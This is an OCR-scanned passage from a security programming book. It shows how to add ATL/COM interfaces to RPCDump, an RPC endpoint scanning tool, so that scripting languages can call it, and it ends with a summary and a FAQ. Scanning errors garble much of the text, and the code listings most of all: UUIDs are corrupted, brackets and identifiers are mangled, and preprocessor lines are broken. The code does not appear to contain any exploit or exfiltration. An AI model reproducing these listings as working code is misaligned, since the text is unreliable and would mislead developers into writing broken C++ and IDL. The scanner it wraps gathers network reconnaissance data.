PTOOL_CALL_CONTEXT pCtx = [PTOOL_C ALL_CONTEXT> TlsGe tValue(g_dwCOMCa 1 IT 1 s) ; 
41 
42 
// NOW, we need to save the record. We'll save it in the S T L 
43 
// vector that corresponds to the instantiated COM object. 
44 
45 
j 
46 } 
Analysis 
All of the preceding routines are named according to the data that is provided by the 
RPCDump tool. Because the data is interrelated (the binding, UUID, version, and 
IntcrfacelD), but not easily accessible .is an interrelated data structure in RPCDump.C, 
the application integration routines are accessed sequentially. When all the data regarding 
an interface is provided to the integration routines, the routine NextRecord is called, 
which commits all the aforementioned data to a particular record and resets the record 
for the next iteration. 
Therefore, the call sequence would look something like this: 
1. 
RPCDump -> SetInterfaceID(...) 
2. 
RPCDump -> SetVersion(...) 
3. RPCDump -> SetUUID(...) 
4. RPCDump -> SetBinding(...) 
5. RPCDump -> NextRecord(...) 
On line 1, the code reads:'extern "C" {'.This code construct dictates that everything 
inside the code block i< to be declared with C linkage. C linkage is necessary is because 
the application integration routines are accessed from the RPCDump routines, which are 
written in C rather than C++. The end of the C external linkage is on line 52. 
All of the integration routines are very similar, except the NextRecord function. 
The first line of any integration routine looks like this: 
if I !g_IsCOM) return; 

Writing Security Components • Chapter 13 
575 
Essentially, if the tool is not started as a COM EXE server, then the global variable 
g_hCOM is FALSE. If it is false, then the first line of all integration routines will imme-
diately return.This makes sense because there is no reason to store the data—there 
cannot be any COM clients, because it wasn't started as a COM EXE server. 
I lore is the line that follows the previous COM detection line, 
FT0OL„C ALL_CONTEXT pC tx a ( PTOOL_CALL_COHTEXT ITlsGetValuel g_dwCOMC a11Tls); 
This line assigns to the local variable pCt.x the value stored in the allocated TLS slot. 
There are a couple things that are noteworthy here: 
• 
Inside the call context structure is a pointer to a vector with all interface infor-
mation records, and a structure containing information about the current 
record. 
• 
The call context structure is allocated and stored when a COM client executes 
a scan command to the RPCDump COM object. 
• 
The TLS slot is allocated inside the CConsoleApp::WinMain after it is deter-
mined that the tool is started as an EXE COM server. 
Getting this far presupposes that the tool was started as a COM EXE server and that 
the integration routine is called with an affinity to a COM client. That affinity is stored 
as a pointer in TLS to a call context structure. 
The following line in an integration routine is responsible for storing the passed argu-
ment in the context record. A preceding integration routine, SetBinding, looks like this: 
pCtx-JCurrentRecard.mJastrBinding = CComBSTRIpBindingl ; 
Because RPCDump.C makes use solely of ANSI strings, the integration routines 
take a parameter of type char* for character string data. Because our COM require-
ments are to support macro languages (VBScript, J Script, and so on), we need to work 
with strings of type BSTR.Therefore, we must convert the strings to the appropriate 
character set. This is easily done by using the CComBSTR object and passing it a 
pointer to the string to convert.The value is then saved in the current record set. 
Tool Interface Definition 
The COM extensions added to the RPCDump tool consist of three COM objects, each 
having one interface defined {excluding I Unknown and IDispatch): 
• 
IRpcEnum 
• 
[EndpointCollection 
• 
lEndpoint 
Each of these objects is shown in Example 13.5. We will examine each in turn. 
y M " » Example 13.5 Interface Definition Excerpts from COMSupport.cpp 
n 
1 
object, 
H COM object 

576 
Chapter 13 * Writing Security Components 
2 
dual, 
// IDispatch & vtable support 
3 
uuid("2F55A03C-9513-4CFl-9939-E0SD72E968E8") 
4 ] 
5 
interface IEndpoint : IDispatch 
6 ( 
7 
[propget) HRESULT Inter£aceID([out, retval] BSTR *bstrVal); 
8 
[propget] HRESULT Versiont(out, retval] BSTR *bstrVal); 
9 
[propget] HRESULT UuidUout, retval] BSTR *bstrVal); 
10 
[propget) HRESULT Binding{(out, retval] BSTR *bstrVal); 
11 ); 
12 
13 [ 
14 
object, 
// COM object 
15 
dual, 
1/ IDispatch & vtable support 
16 
uuid("7C7487E9-7F08-462C-85CF-CF23C08498AC"> 
17 ] 
18 
interface IEndpointCollection : IDispatch 
19 { 
20 
(id(DiSPiD_NEWEHUM), propget] 
21 
HRESULT _NewEnum((out, retval] IUnknown** ppUnk); 
22 
23 
(id(DISPID_VALUE) , propget] 
24 
HRESULT Item! 
25 
[in] long Index, 
26 
[out, retval] IEndpoint **ppval); 
27 
28 
(idfOxOOOOOOOl), 
propget] 
29 
HRESULT C o u n t K o u t , 
r e t v a l ] 
long* p V a l ) ; 
30 
}; 
31 
32 
[ 
33 
object, 
// COM object 
34 
dual, 
// IDispatch & vtable support 
35 
uuidC22M>386A-59D0-4d35-90C5-3089E2O7D73E") 
36 ] 
37 
interface IRpcEnum : IDispatch 
38 t 
39 
HRESULT Execute! 
40 
[in] BSTR bstrTarget, 
41 
[out, retval] iEndpointCollection **ppResult 
42 
); 
43 }; 
IRpcEnum 
The first interface we will examine is the last one in Example 13.5: IRpcEnum.This is 
the default interface for the CRPCDump COM object and as such provides the 
methods and properties for executing the RPCDump tool. 
On lines 32 through 36, the ATL attribute object is specified, which tells ATL to 
inject the code necessary for a COM interface. Additionally, two other modifiers are 
present for the object attribute: dual and uuid.The presence of dual dictates that the 
interface that follows is to be accessed by both IDispatch (late binding support) and by 
vtable access, uuid specifies interface IID. 

Writing Security Components • Chapter 13 
577 
The IRpcEnum interface is defined on line 37. IRpcEnum supports one method 
defined as Execute. This method takes the same required arguments of the command-line 
tool. When called, the tool will enumerate the RFC" endpoints of the specified host, and 
return the results via the OUT variable ppResult. On successful enumeration, ppResult 
points to a collection object that contains information about the endpoints on the target 
system. 
IEndpointCollection 
The collection object returned by the IRpcEnum: -.Execute method is defined on lines 13 
through 30 of Example 13.5. This particular collection object is just like any collection 
object that provides interface pointers. However, for the sake of completeness, we will 
examine it. 
The attributes specified on lines 13 through 17 are the same as the other interfaces 
we will discuss: it is an object interface that is dual and has a particular I ID. 
In lines 20 and 23, you may have noticed the 1DL specifier rV/.To understand the 
purpose of this, you must know how the IDispatch interface works. The IDispatch inter-
face is employed by COM clients that use late binding. Late binding implies that the 
client did not have access to type information at compile time and accesses the interface 
by indirect invocation (IDispatch) rather than direct vtable access.This type of execution 
is made possible primarily by two functions in the IDispatch interface: GetlDsOfNames 
and Invoke. These functions are prototyped in the following example: 
HRESULT GetlDsOENames[ 
REFIID riid, 
OLECHAR FAR* FAR* rgszNames, 
unsigned int CNames, 
LCID 
lcid, 
DISPID FAR* rgDispId 
); 
HRESULT Invoke{ 
DISPID dispIdMember, 
REFIID riid, 
LCID lcid, 
WORD wFIags, 
DISPPARAMS FAR* pDispParams, 
VARIANT FAR* pVarResult, 
EXCEPINFO FAR* pExcepInfo, 
unsigned int FAR* puArgErr 
) ; 
The Invoke method is used to invoke a particular method, as specified by the 
dispIdMember. The value of the dispIdMember is specified in the TypeLib, and therefore, 
must also be specified adjacent to the function in question.This is exactly the case for 
the functions _NewEnum and Item. If the COM client doesn't know about the TypeLib 
information, it can also query for the DISPID function value by calling 
GetlDsOfNames. 

578 
Chapter 13 • Writing Security Components 
The _NewEnum function returns an [Unknown pointer to an enumerator object 
for the collection.This method is typically used by scripting languages to implement 
such features as the for/each syntax. 
The Item method is quite obvious: it takes an integer index and returns an 
lEndpoint interface based on the index specified, ff the index is out of range, the func-
tion will return S_FALSE. 
The Count method returns rhe number of objects in the collection. 
lEndpoint 
The lEndpoint interface that the lEndpointCollection enumerates is defined on lines 0 
through 11 of Example 13.5. This interface provides access to information that corre-
sponds to one interface. That information is made available through several properties: 
InterfacelD, Version, Uuid, and Binding. All of these properties return BSTR values. It is 
noteworthy that this information is gleaned directly from an IFACE_DATA_ENTRY 
Structure, as this is the primary data record for interface information. 
Component Classes 
As there are three defined interfaces, there are three defined component classes.These 
component classes are CEticipoitH, CEndpoiiitColtection, and CRPCDiunp. The code in 
Example 13.6 uses these classes. 
**"t«^ Example 13.6 Component Class CEndpoint Implementation Excerpts from 
mymiil cOMSupport.cpp 
1 
[coclass, uuid("598ES9E2-19E<l-4BBF-9E5C-D180C2FAE6F2"> , noncreatable] 
2 class ATL_NO VTABLE CEndpoint : public IDispatch±mpl<IEndpoint> 
3 ( 
4 
public: 
5 
void Initialize(IFACE__DATA„ENTRY *pEntry} [ 
6 
// Save the entry information this object will refer to 
7 
m__data • *pEntry; 
8 
} 
9 
10 
HRESULT get_InterfaceID(BSTR *bstrVal> { 
11 
*bstrVal = m_data.m_bstrInterfacelD.Copy() ; 
12 
return S_OK; 
13 
} 
14 
15 
HRESULT get_Version(BSTR ^bstrVal) { 
16 
*bstrval - m_data.m_bstrversioniD.Copy(); 
17 
return S_OK: 
18 
} 
19 
20 
HRESULT get_UuidlBSTR *bstrVal) ( 
21 
"bstrVal = m_data,n_bstrUUID.Capy() ; 
22 
return S_OK; 
23 
} 
24 
25 
HRESULT get_Binding(BSTR -bstrVal) { 
26 
*bstrVal ^ m_data.m_bstrBinding.Copy() ; 

Writing Security Components • Chapter 13 
579 
27 
return S_OK; 
28 
} 
29 
30 
protected: 
31 
IFACE_DATfl_ENTRY m_data; 
32 }; 
Analysis 
CEndpoint is very simple. Its sole purpose is to provide a way for COM clients to access 
a particular record of information. 
At line 1, the ATL attribute codass is specified and asserts that the ATL attribute 
provider is to inject the appropriate code to make this a fully functional component 
class.The noncreatable IDL attribute is also specified and asserts that this object is not to 
be instantiated by COM clients. 
Line 2 specifies the beginning of the CEndpoint class declaration. You will notice 
the usage of the ATL macro ATL_NO_VTABLE. This macro expands 
declspec(novtable) and its usage optimizes the creation of the class by omitting the 
vtahle pointer initialization routines from its constructor and destructor. Note, however, 
that this is only safe to do on a class that is not directly creatable, such as in this case (as 
you recall, it is CComObject that actually instantiates component classes). 
Line 2 also specifies that the component class inherits the class IDispatchlmp! with a 
template parameter of IEndpoint. Essentially, this does two things: a) brings in the func-
tionality to support the IDispatch interface—which is required for macro language sup-
port, and b) implicitly inherits the IEndpoint interface that is implemented by the 
component class. 
On line 5, you will see the only member function that does not correspond to an 
interface implementation: Initialize. As its name presupposes, it is used to initialize the 
component class with the data it will provide through its interfaces. 
Lines 10 through 28 are all essentially the same and consist of the IEndpoint inter-
face. The structure of these functions is also the same: assign to the passed BSTR* the 
string content of their request. For instance: 
HRESULT get_InterfaceID(BSTR *bstrVal) { 
*bstrVal = m_data.m_bstrInterfaceID.Copy(); 
return S_0K; 
) 
The aforementioned code assigns to the argument bslrVa! the value of its persisted 
information about the interface ID: m_data.m_bstrInterfaceID.The variable 
m_bstrIntcrfaceID is of type CComBSTR and supports the Copy method, which essentially 
duplicates its string and returns it as the return value. One thing to note about this code is 
that it does not perform error checking on the parameter bstrVhl, This is for brevity pur-
poses. Code should always assume the worst possible scenario—especially COM interfaces. 
This section of code shown in Example 13.7 contains the collection/enumerator 
code for this project.This code is quite typical ATL collection/enumerator implementa-
tion code. 

580 
Chapter 13 • Writing Security Components 
Example 13.7 Component Class CEndpoint Implementation Excerpts from 
COMSupport.cpp 
1 typedef CComEnumOnSTL< 
2 
IEnumVARIANT. 
3 
J, uuidof (IEnumVARIANT) , 
4 
VARIANT, 
5 
_CopyEndpointIFToVariant, 
6 
std: :vector<IFACE_DATA_ENTRl> 
7 
> EnumType; 
8 
9 
typedef ICollectionOnSTLImpl< 
10 
IEndpointCollection, 
1 1 
std: :vector<IFACE_DATA_ENTRl>. 
12 
IEndpoint*, 
13 
_CopyInformationToEndpointInterface, 
14 
EnumType 
15 
> EndpointcollectionType; 
16 
17 
18 [ 
19 
coclass, 
20 
threading=apartment, 
21 
uuidC2C793CBF-51FA-4146-814B-022902FBDDCF-), 
22 
noncreatable 
23 i 
24 class ATL_NG_VTABLE CEndpointCollection : 
25 
public IDispatchImpl< EndpointCollectionType, & uuidof(IEndpointCollection)> 
26 ( 
27 public; 
28 
it No methods necessary for this collection object. 
2 9 >; 
Analysis 
Lines 1 through 7 define a typedef for an enumerator object, EnumType, that is used by 
the collection object. If you recall, an enumerator object is returned when the collec-
tion's _Nc\i'Enum method is called. Let's examine this code.The EnumType object is 
implemented using the CComEmtmOiiSTL class: 
template <class Base, const IID* piid, class T, class Copy, class CollType, class 
ThreadModel = CComObjectThreadModel> 
class ATLJK>_VTABLE CComEnumOnSTL : 
public lEnuntOnSTLIraplOase, piid, T, Copy, CollType>, 
public CComObjectRootEx-c ThreadModel > 
1. The first template parameter is Base, and the value specified for this parameter 
is the interface, which the enumerator is to implement. The syntax of such an 
interface is typically IEnumXXXX, and in our case, IEnumVARIANT There 
is no IEnumXXXX interface per se because the IEnumXXXX must be spe-
cialized to return a certain variable type.Therefore, the use of this class implies 
the conformity to the IEnumXXXX standards. 

Writing Security Components • Chapter 13 
581 
2. The next parameter is the IID of the interface that is to be implemented by 
the class. As you can see by the presence of the classes inherited by the 
CCoinEiiituiOiiSTL class, it implements an object that can be created by 
CComObject. Obviously, if it implements a component class, it must imple-
ment I Unknown, and most importantly, Querylnterface. In order to support 
the Querylnterface method, it must know about the IID of the interface it 
implements. In the preceding case, & 
uuidof(IEnum VARIANT) is used for 
the value of the interface ID. 
3. The next parameter is T, which is the actual datatype provided by the enumer-
ator. The reason why the enumerator object needs this information is that it 
implements one method that exposes the datatype directly: 
STDMETHOD(Next)(ULONG celt.T* rgelt, ULONG* pceltFetched); 
4. The fourth parameter is the ATL copy policy. Because internally the enumer-
ator stores a STL vector of arbitrary data, it needs to be able to make a con-
nection between that data and the datatype it provides. In the preceding case, 
that connection is: IFACE_DATA_ENTRY -> VARIANT. 
5. 
The argument specified as the copy policy is basically a class that implements 
three functions: copy, init, and destroy. 
6. 
The fifth parameter specified is the type of STL container that is provided as a 
member variable of the component class known as n\_coU. A common method 
of enumerator initialization is to initialize that variable prior to returning the 
enumerator's interface pointer to clients. 
Lines 9 through 15 define a new class used for implementing a collection object, 
EndpoititCoikcthmTypc. Note, however, that EtidpoiiitCollcctioiiTypc alone isn't enough to 
create a component class—that is, you cannot use it as an argument to CComObject, 
because it lacks a threading model and IDispatch implementation. Lines 18 through 29 
actually implement the component class for EndpointCollectionType. 
The EndpointCollectionType typedef is a specialized definition of 
ICollectionOnSTLImpl, and is defined in the following example: 
template <class T, class CollType, class ItemType, 
class CopyItern, class EmimType> 
class ICollectionOnSTLImpl : public T 
7. The first argument is the interface that is to be implemented by 
ICollectionOnSTLImpl, just like the preceding enumerator definition.The 
value specified in the previous case is the interface IEndpointCollection. 
8. 
The second argument is the STL collection datatype, which is stored in the 
collection object, in the m_coll member. 
9. 
The third argument is the datatype that is returned directly from the collection 
interface via the Item method. 

582 
Chapter 13 • Writing Security Components 
10. The fourth argument is the copy policy that translates the STL collection 
datatype to the argument that is provided by the Item method. Essentially, the 
translation for the preceding case is IFACE_DATA_ENTRY -> IEndpoint*. 
1 I. The fifth argument is the enumerator object (which we previously discussed). 
It's returned via the _Neu>Entmi method.The enumerator object specified was 
EnumType. 
• 
Now that the required definitions are completed, the collection object can 
be implemented on lines 18 through 29. 
• 
Lines 18 through 23 define the attributes for the component class.The 
attributes specified dictate that the following class declaration implements a 
component class that uses the apartment threading model and cannot be 
created directly, such as through CoCreatelnstance. 
• 
Line 25 of the component class inherits the IDispatchlmpl ATL imple-
mentation of IDispatch and specifies as the template argument for the 
implemented interface the collection typedef EndpointCollectionType. 
Example 13.8 shows how the primary object—CRPCDump—is implemented. 
Example 13.8 Component Class CRPCDump Implementation Excerpts from 
COMSupport.cpp 
1 i 
2 
coclassH 
3 
threading("apartment-) , 
4 
vi_progid("RPCDump.Scanner*), 
5 
versionll.0}, 
6 
uyid( "8B68fj433-A2EE-49lE-B2CF-F858ClC16A93n) 
7 ] 
8 
c l a s s ATL_NO_VTABLE CRPCDump : 
9 
public 
IDispatchImpl<IRpcEnum> 
10 ( 
11 
public: 
12 
HRESULT ExecutefBSTR bstrTargetH lEndpointCollection **ppResult) 
13 
{ 
14 
// Verify arguments 
15 
if 
(IbstrTarget 
|| 
IppResult) 
16 
return E_POINTER; 
17 
18 
Jl pArg[0] - the module path 
19 
SI pArgll] = the target 
20 
USES_CONVE RSION; 
21 
CHAR szModule[MAX_PATH + 1 ] ; 
22 
GetModuleFilenameAINULL, 
szModule, 
MAX_PATH); 
23 
24 
int cArgs = 2 j 
25 
char *pArgf2] 
- {szModule, W2A(bstrTarget}}; 
26 
27 
// 
28 
// Create the collection of endpoints which is returned as 
29 
// the result of this function. 
30 
// 

Writing Security Components • Chapter 13 
31 
CComObject<CEndpointCollections *pResult; 
32 
CComObject<CEndpointCollection:>:;CreateInstance(SpResnlt); 
33 
pResult->AddRef0; 
34 
35 
// 
36 
// Setup and store the call context pointer in thread 
37 
1i local storage 
38 
// 
39 
PTOOL_CALL_CONTEXT pCtx = new TOOL_CALL_CONTEXT; 
40 
pCtx->pIfaceVector • &pResult->m_coll; 
41 
42 
TlsSetvalue(g_dwCOMCallTls, (PVOiDfpCtx); 
43 
44 
BEGIN_ENTRYPOINT ( ) ; 
45 
46 
END_ENTRYPOINT i ) ; 
47 
48 
// The call is complete so we're done with the call context. 
49 
delete pctx; 
50 
51 
// Assign the collection result to the argument ppFtesult 
52 
*ppResult = pResult; 
53 
54 
return S_OK; 
55 
} 
56 ), 
Analysis 
Lines 1 through 7 should look quite familiar at this point because it is the ATL 
attribute declaration stating that the following is a component class with the following 
characteristics: 
• 
The component is to exist only in the apartment threading model. 
• 
It's version-independent ProgID is "R PC Dump. Scanner" and therefore can be 
loaded by such code as: var rpcdump — new 
ActiveXObject("RPCDump.Scanner"). 
• 
The version of the component class is 1.0. 
• 
The CLSID of the class is {8B680433-A2BE-491E-B2CF-F858C1C16A93}. 
Like the preceding component classes, this class is declared with the 
ATL_NO_VTABLE compiler directive, and inherits the IDispatchlmpl interface, which 
itself derives from the IRpcEnum interface that is implemented by the component. 
The only method of the IRpcEnum interface is Execute, and the Execute method 
defined in this component class takes up the majority of the code, lines 12 through 55, 
The Execute method takes two arguments, one of which is to be used as the return 
value of the function. The first argument is the system on which the RPC endpoint 
database is to be scanned. If the local system is desired, such values as "localhost" or 
"127.0.0.1" can be specified. The second parameter returns the result of the scan on the 
target system and provides those results in the form of a collection interface for an array 
of IEndpoint interfaces. 

584 
Chapter 13 • Writing Security Components 
The primary purpose of this function is to create an environment suitable for exe-
cuting the tool, gleaning the desired data from the tool via integration routines, and 
returning the data via the collection interface. The way this is all accomplished will now 
be explored. 
Lines 14 through 16 validate the arguments passed to the Execute method, as should 
always be done for COM interfaces. 
Lines 20 through 25 set up the well-known argv and arg( arguments that are neces-
sary to call the tool's rpcdump_main routine.The argv array that is built in these lines 
looks like this: 
[0] The path to the module, for example. •C: \\rpedump.exe" 
[1] Target host name, for example, "John" 
There are therefore two arguments, and the arqc variable reflects this. rpcdump_main 
can now be successfully executed. 
Lines 31 through 33 create the collection object that is returned as a result of this 
function. You will notice that the variable ut_coll, as inherited from 
ICollectionOnSTLImpl, is also used as a vector pointer in which all interface record data 
is stored. This becomes obvious when you read line 40 that assigns a pointer to the 
m_coll variable into the TOOL_CALL_CONTUXT structure. 
Line 39 instantiates the TOOL_CALL_CONTEXT structure on the heap and on 
line 42 puts the pointer to this structure intoTLS.Tliis is the origin of the structure that 
keeps track of all gleaned data from the application integration routines. If you recall the 
following code from an integration routine, you will understand this more completely. 
PTOOL„CALL„CONTEXT pCtx = I PTOOL_CALL_CONTEXT>TlsGetValue (g_dwCOMCflllTls) ; 
Lines 44 through 4(> make the actual call to rpcdump_main. Lines 44 and 46 make 
use of the B E G I N I E N T R Y P O I N T and END_ENTRYPOINT macros, as was dis-
cussed previously.The argv and argc arguments built on lines 20 through 25 are passed as 
arguments to the rpcdump_main function. 
The last step required of this function is to clean up its state and return the results to 
the client. Line 49 cleans up the function state by deleting the TOOL_CALL_CON-
TEXT structure, and Line 52 assigns to the method's OUT argument ppRcsuh a pointer 
to the result collection object. 
Application Integration: COMSupport.h 
Switching gears now, let's take a closer look into what must be done in order to get rpe-
dump. c to provide information to the application integration routines. 
The code in Example 13.9 is the complete listing of COMSupport.H. 
Example 13.9 The Contents of COMSupport.h Are Listed 
1 // Rather than exit, generate an exception that will be caught. 
2 ftdefine exit (x) * ( (unsigned longMO) = 0 ; // access violation 
3 
4 void SetinterfaceID(char *pIFaceID); 
5 void SetVersion{char *pVersion); 

Writing Security Components • Chapter 13 
6 void SetUUIDIchar *pUuid); 
7 void SetBinding[char *pEinding}; 
8 void NextHecordO ; 
Analysis 
Line two is the only non-obvious line. Its purpose is to redefine the exit function to that 
of this macro. Therefore, when the exit function is used anywhere in the body of rpc-
dump.c it will be replaced with the contents of this macro. The contents of the macro 
essentially cause an access violation to occur.The reason for why it is necessary are several: 
• 
Most importantly, if I RpcEnum:: Execute is invoked, which subsequently calls 
]pcdump_niain, which then calls exit, and the entire COM EXE server termi-
nates, the client will receive an error stating that the COM server terminated 
unexpectedly.This is obviously not desired behavior. 
• 
Causing an exception will allow execution to continue precisely where it is 
desired. 
• 
Using the macros BEG1N_ENTRY POINT and END_ENTRYPOINT and 
redefining symbols that cause an immediate exit is very clean and convenient. 
The next several lines of code, 4 through 8, define the symbols for the application 
integration routines. 
Application Integration: RPCDump.C 
We will now examine the changes to the RPCDump.C file. Example 13.10 shows a 
series of code excerpts from RPCDuinp.C. 
I i. 
I 
_ _ _ - Example 13.10 Excerpts from RPCDump.C that Pertain to COM Instrumentation 
• • ^ ^ ^ ^ 
1 
^include ^windows .h> 
2 #include -cwinnt .h> 
3 
4 
ttinclude <rstdio.h> 
5 
6 
#include <rpc.h> 
7 #include <ipcdce.h> 
8 
9 
((include 
"COMSupport .h" 
Analysis 
|,VNi,EJJj As you can see in line 9, COMSupport.h (which was previously discussed) is included in 
| the RPCDump.C file. Note that this is the last header to be included. 
i p c E r r = RpcMgmtEpEltlnqNext 
{hlnq. 
UJfldt fchEnumBind. &uuid, 
&pAnnot) ; 
2 
i£ 
(rpcErr == RPC_S_OK> 
{ 
3 
unsigned char *str • NULL; 
4 
unsigned char *princName = NULL; 
5 
numFound++; 
6 
7 
// 

586 
Chapter 13 • Writing Security Components 
8 
// Print Ifld 
9 
// 
10 
if (UuidToString (fclfld.Uuid, &str) = RPC_S_OK) { 
11 
char szVersion(50]; 
12 
printf ("Ifld: %s version %d.%d\n", str, Ifld.VersMajor, 
13 
Irld.VersMinor); 
14 
1 5 
sprintf (szVersion, "%d, %d", If IcLVersMajor, IfId.VersMinor) ; 
16 
17 
// COM Support Code 
18 
SetVersion(szVersion); 
19 
SetInterfaeeID((char*)str); 
20 
II 
-
2t 
22 
RpcStringFree {&str>; 
23 
) 
Analysis 
The preceding code is responsible for gleaning an RPC interface ID and the version of 
the interface. After the data is gleaned, it is provided to the appropriate application inte-
gration routines on lines 25 and 26. 
b1 
11 
2 
// Print object ID 
3 // 
4 
if (UuidToString (Imuid, istr) == RPC_S_OK) ( 
5 
printf C-UUTD: %s\n\ str); 
6 
7 
SetUUIDI(char*>str); 
8 
9 
RpcStringFree 
t&str); 
10 i 
Analysis 
wNfiEis The preceding code fragment gleans die object ID and provides that data to the applica-
| tion integration routine on line 7. 
1 // 
2 
// Print Binding 
3 // 
4 
if (RpcBindingToStringBinding (hEnumBind, &str} == RPC_£_0KJ ( 
5 
printf {"Binding: %s\n"h str); 
6 
7 
SetBinding((char*)strJ; 
8 
9 
RpcStringFree 
( i s t r ) ; 
10 
} 
Analysis 
•iYNf.j*!; The preceding code fragment gleans the interface RPC binding string and provides that 
to the integration routine SetBinding on line 7. 
1 
HextRecordl); 
2 
) 

Writing Security Components * Chapter 13 
587 
3 
> while (rpcErr != RPC_X_NO_MORE_ENTRIES) ; 
Analysis 
After all relevant data regarding a particular interface has been gleaned, RPCDump calls 
the integration routine NextRecord and commits the previous stored data into a record. 
1 
int 
2 
rpcdunnp_main(int argc, char *argv[) ] 
3 < 
4 
// code omitted 
5 
} 
Analysis 
The preceding code is the definition of the RPCDump main en try point. The name of 
this function was of course previously main, and was renamed so that execution flow 
control could be managed by the COM support routines. 
Summary 
The Component Object Model (COM) is a programming specification that enables 
software to work together. Some of the benefits of COM enabling your security tools 
include: 
• 
Language Neutrality COM object interfaces can be called from any lan-
guage that supports the binary contract of COM. Such languages include, but 
are certainly not limited to, the following: C, C++, C#, Visual Bask, JScript, 
Perl, and Python.Therefore, for example, a COM object implemented in 
Visual Basic can be called by a client in C, and vice versa. 
• 
Operating Context COM supports the true separation of interface and 
implementation, in the actual sense. When an application makes a call to a 
COM object, the location in which the call takes place may be one of three 
options: inside the client's address space, inside another application's address 
space, or on a remote server. 
• 
Macro Languages By supporting a specific interface, any COM object can 
be called from a macro language such as VBScript or JScript. Therefore, any 
such COM object can be instantiated from Internet Explorer or from the 
Windows Scripting Host. 
Active Template Library (ATL) is a better way of programming COM for C+ + 
applications. It minimizes the plumbing code necessary in writing COM technologies, 
and, unlike other technologies such as MFC, provides a great framework for developing 
highly efficient and small component modules. 
www.syngress.com 

588 
Chapter 13 • Writing Security Components 
Solutions Fast Track 
t 
COM 
0 
COM is a specification that defines the means by which binary applications 
load and access objects and their interfaces, with language neutrality and oper-
ating context neutrality. 
0 
The base interface supported by all COM objects is IUnknown, and it has 
three methods: QueryInterface,AddRef, and Release. 
ATL 
0 
ATL is a highly efficient template-based library for implementing COM in 
C++ applications. 
0 
With the release of Visual Studio .NET,ATL now supports attribute-based 
programming. 
Adding COM Extensions to the RPCDUMP Tool 
0 Adding COM extensions to an existing security tool will make it easier to 
access from arbitrary languages and operating contexts. 
0 
When adding COM extensions to an existing security tool, keep several goals 
in mind: having a low impact on the existing source code, and where the 
optimal points of gleaning data from the tool are. 
Links to Sites 
I For more information, go to the following Web sites: 
www.appHcationdefense.com Application Defense has a solid collection of 
free security and programming tools, in addition to all of the code presented 
throughout this book. 
http://msdn.microsoft.com The Microsoft Developer Network provides 
Microsoft developers with a huge amount of information that pertains to 
developing on Microsoft platforms, including COM and ATL. 
http://msdn.microsoft.com/vstudio/ This link is the Microsoft Web 
page for Microsoft's enterprise development product, Visual Studio .NET. 
www.syngress.com 

Writing Security Components * Chapter 13 
589 
• 
http://www.bindview.com/support/Razor/Utilities/ This link is the 
homepage for security tools developed by BindView's RAZOR team, such as 
RPCDump. 
Frequently Asked Questions 
The following Frequently Asked Questions, answered by the authors of this book, 
are designed to both measure your understanding of the concepts presented in 
this chapter and to assist you with real-life implementation of these concepts. To 
have your questions about this chapter answered by the author, browse to 
www.syngress.com/solutions and click on the "Ask the Author" form. You will 
also gain access to thousands of other FAQsatlTFAQnet.com. 
Qi Where can I learn more about COM and ATL? 
A: Many resources on the Internet provide a decent primer to COM.The best resource 
is, of course, on Microsoft's Web site. Be sure to check out www.microsoft.com/com 
and msdn.microsoft.com. A good introduction to straight COM fundamentals is 
Inside COAtf by Dale Rogerson (Redmond, WA: Microsoft Press, 1996).You also can 
learn about ATL from the MSDN, as well as another good book called Inside ATL, 
by George Shepherd and Brad King. 
and Brad 
rtes? 
Q: What are ATL attributes? 
feature 
Ai Attribute programming is a new feature of Visual Studio .NET. Using this new C+ + 
feature can speed up development time rapidly by leaving the plumbing work to the 
compiler and its associated attribute provider modules. When an attribute is used, 
your code is injected with code at compile time, which will accomplish the goal of 
the attribute. For instance, if the attribute jinodulcfdll/j is used, your module will he 
injected with four exported COM functions: DllGetClassObject, 
DllCanUnloadNow, DllRegisterScrver, and DllUnregisterserver. 
Q: What does the preprocessor definition _ATL_ATTRIBUTES do? 
A: The definition of _ATL_ATTRIBUTES brings in support for ATL attributes.The 
omission of this definition and the utilization of ATL attributes can bring unex-
pected results, so be sure this is defined when using ATL attributes. 
www.syngress.com 

590 
Chapter 13 • Writing Security Components 
Q: I understand how using the BEGIN_ENTYRPOINT and END_ENDTRYPOINT 
macros can help flow control, but how can I get the exit value specified in the CRT 
"exit" function when an exception is thrown? 
A; In order to answer this question, it is helpful to expand the 13EGIN_ENTRY-
POINT and END_ENTRYPOINT macros: 
#deftne BEGIN_ENTRYPOINT ( ) 
try { 
i 
#define EHE_ENTRYPOIHT() 
} \ 
except(EXCEPTION_EXECUTE_HANDLER) 
{) 
And the redefinition of exit(n): 
fldenne exit (x} *( {unsigned long*)0) = 0; 
In order to save the exit code generated, a few changes need to be imple-
mented. First, you must decide how the exit function will return the code without 
exiting.The easiest option is to generate an exception, but one that contains useful 
information. The following is an example of such code: 
#define EXCEPTI0N_COMSUPPORT I0XDEADB33F) 
#define exit (x) \ 
if (g_IsCOM) ( \ 
int arg[] = { ##*##, 0}; \ 
RaiseExceptiont \ 
EXCEPTION_COMSUPPORTr \ EXCEPT ION_NONCONTINUABLEr \ 
1, (PULOWG)karg); \ 
} else TerminateProcess( \ 
GetCurrentProcess(), ##x##)j 
The preceding code does essentially the same thing as the previous definition, 
except more explicitly. First, it tests to see whether it should raise an exception, or 
just terminate altogether. If it must raise an exception, it does so using the Win32 
RaiseException function, passing the exit code as a parameter. 
The code that will catch such a code construct is as follows: 
i n t nRes; 
LPEXCEPTION_POINTERS p i ; 
t r y { 
nRes • rpcdump_mainCg_argc, 
g_argv) ; 
} 
except(pi = GetExceptionlnformation(), 
EXCEPTION_EXECUTE_HANDLER) { 
nRes = pi->ExceptionRecord->Exceptionlnformation[0] ; 
} 
www.syngress.com 

Writing Security Components * Chapter 13 
591 
This code does essentially the same thing that the previous BEGIN_ENTRY-
POINT macro does. However, it will set the return value regardless of whether or 
not the return value is returned, rather than thrown. 
Q; Sometimes my screen flickers with a console window when my script calls a security 
component. Why is that? 
A; This is because the tool is designed to function as both a console security tool and a 
security component. When the tool determines that it is running in COM mode, 
the console is immediately closed.There are two ways to mitigate this issue, both of 
which have disadvantages: 
• 
Design the tool as a Win32 GUI application. When the tool determines that it 
is running in a security tool mode, attach to the parent's console, with the 
AttachConsole function, and set the appropriate CRT functions to the new 
STDOUT and STDIN pointers. The disadvantage to this is that the text dis-
played in the console will not look identical to the security tool when it was 
designed as exclusively a console application. 
• 
Remove the console portion of the application and design it exclusively as a 
security component. The disadvantage to this is obviously that the tools are 
now separated. 
Q: Why is it necessary to override the RegisterServer function in the CConsolcApp 
class? 
